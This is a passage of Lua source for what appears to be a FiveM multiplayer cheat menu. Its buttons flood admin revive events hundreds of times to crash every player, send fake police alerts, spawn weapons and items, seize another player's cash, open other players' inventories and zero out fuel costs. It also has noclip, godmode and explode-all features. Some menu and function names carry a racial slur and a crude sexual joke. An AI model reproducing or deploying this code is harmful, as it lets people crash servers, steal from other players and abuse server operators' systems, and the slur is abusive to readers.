                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
            elseif IhadSexWithMyStepMother.Button("~r~Crash all player ipx") then
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
            elseif IhadSexWithMyStepMother.Button("~r~Crash all player qb") then
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
            elseif IhadSexWithMyStepMother.Button("~r~Crash all player drk") then
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)                
				elseif IhadSexWithMyStepMother.Button("~g~REVIVE All Players in Server") then
				TriggerServerEvent("qb-admin:server:revivePlayer", -1)
				TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
            elseif IhadSexWithMyStepMother.Button("Open Skin Menu For All") then
                TriggerServerEvent('bw-admin:server:OpenSkinMenu', -1)
                TriggerServerEvent('qb-admin:server:OpenSkinMenu', -1)
				TriggerServerEvent('ipx-admin:server:OpenSkinMenu', -1)
				TriggerServerEvent('drk-admin:server:OpenSkinMenu', -1)
            elseif IhadSexWithMyStepMother.Button("~b~Troll Cops Notifcations") then
                TriggerServerEvent("txaLogger:DeathNotice", killer, deathResean)
                TriggerServerEvent("qb-bankrobbery:server:callCops", "pacific", 0, streetLabel, pos)
                TriggerServerEvent("qb-bankrobbery:server:callCops", "paleto", 0, streetLabel, pos)
                TriggerServerEvent("police:server:GunshotAlert", streetLabel, pacific, true, policestaion, vehicleInfo)
                TriggerServerEvent("prison:server:SecurityLockdown")
                TriggerEvent("police:SetCopAlert")
                TriggerServerEvent('qb-drugs:server:callCops', streetLabel, pos)
                TriggerServerEvent('qb-jewellery:server:PoliceAlertMessage', "69 Store On Top", plyCoords, false)
                TriggerServerEvent('qb-jewellery:server:PoliceAlertMessage', "69 Store On Top", plyCoords, true)
                TriggerEvent("chatMessage", "69 Store On Top", "69 Store On Top", msg)
                TriggerServerEvent("police:server:VehicleCall", pos, msg, alertTitle, streetLabel, modelPlate, Name)
            elseif IhadSexWithMyStepMother.Button("~y~Gas for car") then
                TriggerServerEvent('fuel:pay', 0)
            elseif IhadSexWithMyStepMother.Button("Give Your Self Pistol 50.") then
                TriggerServerEvent("QBCore:Server:AddItem", "weapon_pistol50", 1)
				TriggerServerEvent("ipxCore:Server:AddItem", "weapon_pistol50", 1)
                TriggerServerEvent("QBCore:Server:AddItem", "pistol_ammo", 30)
				TriggerServerEvent("ipxCore:Server:AddItem", "pistol_ammo", 30)
                TriggerServerEvent("bw:Server:AddItem", "weapon_pistol50", 1)
                TriggerServerEvent("bw:Server:AddItem", "pistol_ammo", 30)
            elseif IhadSexWithMyStepMother.Button("~g~Revive Player By ID") then
                local serverID = GetKeyboardInput("Enter Player Server ID:")
                TriggerServerEvent('qb-admin:server:revivePlayer', serverID)
				TriggerServerEvent('ipx-admin:server:revivePlayer', serverID)
            elseif IhadSexWithMyStepMother.Button("Steal Player Money By ID") then
                local serverID = GetKeyboardInput("Enter Player ID:")
                TriggerServerEvent("police:server:SeizeCash", serverID)
            elseif IhadSexWithMyStepMother.Button("~b~ADD and SELL Diamond") then
                TriggerServerEvent("QBCore:Server:AddItem", "diamond", 1)
                TriggerServerEvent('QBCore:Server:startSelling', "diamond")
                TriggerServerEvent('QBCore:Server:startSelling', "diamond")
				TriggerServerEvent("ipxCore:Server:AddItem", "diamond", 1)
                TriggerServerEvent('ipxCore:Server:startSelling', "diamond")
                TriggerServerEvent('ipxCore:Server:startSelling', "diamond")
            elseif IhadSexWithMyStepMother.Button("~v~Open Admin Menu") then
                TriggerEvent('qb-admin:client:openMenu', source, group, dealers)
				TriggerEvent('ipx-admin:client:openMenu', source, group, dealers)
            elseif IhadSexWithMyStepMother.Button("Open Inventory By ID") then
                local serverID = GetKeyboardInput("Enter Player Server ID:")
                TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", serverID)
            end
			
		
        
        
        
        elseif IhadSexWithMyStepMother.IsMenuOpened('vrp') then
            if IhadSexWithMyStepMother.Button("~y~VRP Toggle Handcuffs") then
                vRP.toggleHandcuff()
            elseif IhadSexWithMyStepMother.Button("~y~VRP Clear Wanted Level") then
                vRP.applyWantedLevel(0)
            end
        
        elseif IhadSexWithMyStepMother.IsMenuOpened('settingslol') then
        if IhadSexWithMyStepMother.MenuButton('~r~About W W B A Menu', 'credits') then end
        if IhadSexWithMyStepMother.ComboBox('<font color="#E400FF">Menu ~s~X', menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
        currentMenuX = currentIndex
        selectedMenuX = currentIndex
        for i = 1, #menulist do
            IhadSexWithMyStepMother.SetMenuX(menulist[i], menuX[currentMenuX])
        end
        end) 
        then
elseif IhadSexWithMyStepMother.ComboBox('<font color="#E400FF">Menu ~s~Y', menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
        currentMenuY = currentIndex
        selectedMenuY = currentIndex
        for i = 1, #menulist do
            IhadSexWithMyStepMother.SetMenuY(menulist[i], menuY[currentMenuY])
        end
        end)
        then
        end

        elseif IhadSexWithMyStepMother.IsMenuOpened('credits') then
            for _, v in pairs(developers) do 
				if IhadSexWithMyStepMother.Button(v[1], v[2]) then end 
			end        
     
        elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then IhadSexWithMyStepMother.OpenMenu('StupidNiggaPaster')
	
		
		elseif IsDisabledControlPressed(0, Keys[menuKeybind2]) then IhadSexWithMyStepMother.OpenMenu('StupidNiggaPaster')
        
        elseif IsControlJustReleased(0, Keys[noclipKeybind]) then ToggleNoclip() 
		
		elseif IsControlJustReleased(0, Keys[teleportKeyblind]) then TeleportToWaypoint() 
		
		elseif IsControlJustReleased(0, Keys[fixvaiculoKeyblind]) then fixcar() end 
        
        IhadSexWithMyStepMother.Display()
        
       
        if Demigod then
            if GetEntityHealth(PlayerPedId()) < 200 then
                SetEntityHealth(PlayerPedId(), 200)
            end
        end
        
        if ADemigod then
            SetEntityHealth(PlayerPedId(), 189.9)
        end
 
        if Noclipping then
            local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
            local k = nil
            local x, y, z = nil
            
            if not isInVehicle then
                k = PlayerPedId()
                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
            else
                k = GetVehiclePedIsIn(PlayerPedId(), 0)
                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
            end
            
            if isInVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then RequestControlOnce(k) end
            
            local dx, dy, dz = GetCamDirection()
            SetEntityVisible(PlayerPedId(), 0, 0)
            SetEntityVisible(k, 0, 0)
            
            SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
            
            if IsDisabledControlJustPressed(0, Keys["LEFTSHIFT"]) then -- Change speed
                oldSpeed = NoclipSpeed
                NoclipSpeed = NoclipSpeed * 2
            end
            if IsDisabledControlJustReleased(0, Keys["LEFTSHIFT"]) then -- Restore speed
                NoclipSpeed = oldSpeed
            end
            
            if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
                x = x + NoclipSpeed * dx
                y = y + NoclipSpeed * dy
                z = z + NoclipSpeed * dz
            end
            
            if IsDisabledControlPressed(0, 269) then -- MOVE BACK
                x = x - NoclipSpeed * dx
                y = y - NoclipSpeed * dy
                z = z - NoclipSpeed * dz
            end
			
			if IsDisabledControlPressed(0, Keys["SPACE"]) then -- MOVE UP
                z = z + NoclipSpeed
            end
            
			if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then -- MOVE DOWN
                z = z - NoclipSpeed
            end
            
            
            SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
        end
        
        if ExplodingAll then
            ExplodeAll(includeself)
        end
        
        if Tracking then
            local coords = GetEntityCoords(GetPlayerPed(TrackedPlayer))
            SetNewWaypoint(coords.x, coords.y)
        end
        
		if FlingingPlayer then
			local coords = GetEntityCoords(GetPlayerPed(FlingedPlayer))
